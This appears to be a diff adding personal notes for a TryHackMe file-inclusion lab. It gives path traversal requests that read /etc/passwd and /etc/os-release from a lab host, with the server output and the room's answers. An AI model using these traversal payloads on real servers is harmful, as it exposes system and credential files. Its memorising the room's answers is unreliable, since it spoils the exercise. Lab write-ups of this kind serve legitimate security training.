@@ -1,2 +1,40 @@
+Give Lab #3 a try to read /etc/passwd. What is the request look like?
+
+http://10.10.252.186/lab3.php?file=/../../../../../etc/passwd%00  <-- run
+
+answer: /lab3.php?file=/../../../etc/passwd%00
+
+
+Task 3 Path Traversal 
+Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file.
+
+file_get_contents
+
+or http://10.10.252.186/lab4.php?file=?
+File Content Preview of ?
+
+Warning: file_get_contents(?) [function.file-get-contents]: failed to open stream: No such file or directory in /var/www/html/lab4.php on line 29
+
+
+
+http://10.10.252.186/lab6.php
+
+
+http://10.10.252.186/lab6.php?lang=languages/../../../../../etc/passwd
+
+File Content Preview of ?lang=languages/../../../../../etc/passwd
+Access Denied! Allowed files at THM-profile folder only! 
+
+answer: THM-profile
+
+
+http://10.10.252.186/lab6.php?THM-profile/../../../../../etc/os-release
+
+ THM-profile/../../../../../etc/os-release  >-- include
+ 
+ 
+File Content Preview of THM-profile/../../../../../etc/os-release
+NAME="Ubuntu" VERSION="12.04.5 LTS, Precise Pangolin" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu precise (12.04.5 LTS)" VERSION_ID="12.04" 
+
 https://tryhackme.com/room/fileinc
 https://medium.com/@kumarishefu.4507/try-hack-me-write-up-module-vulnerability-research-file-inclusion-aaa898210bc5
